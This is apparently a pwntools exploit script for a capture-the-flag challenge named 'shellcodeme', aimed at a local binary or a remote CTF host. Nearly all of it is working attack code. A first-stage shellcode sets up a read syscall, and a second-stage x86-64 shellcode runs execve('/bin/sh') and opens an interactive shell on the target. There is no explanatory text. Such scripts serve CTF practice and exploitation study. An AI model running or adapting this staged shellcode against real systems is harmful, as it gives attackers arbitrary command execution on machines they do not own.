#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./shellcodeme"
elf=ELF(pwn_file)
context.arch="amd64"
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("shellcodeme.420blaze.in",420)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

shellcode="""
    push rdx
    pop rsi
    pop rdx
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rdi
    syscall
"""
payload=asm(shellcode)
debug()
conn.sendline(payload)
shellcode="""
    push 0x3b
    pop rax
    call here
    .ascii "/bin/sh"
    .byte 0
here:
    pop rdi
    xor rsi,rsi
    xor rdx,rdx
    syscall
"""
conn.sendline(asm(shellcode))
conn.interactive()
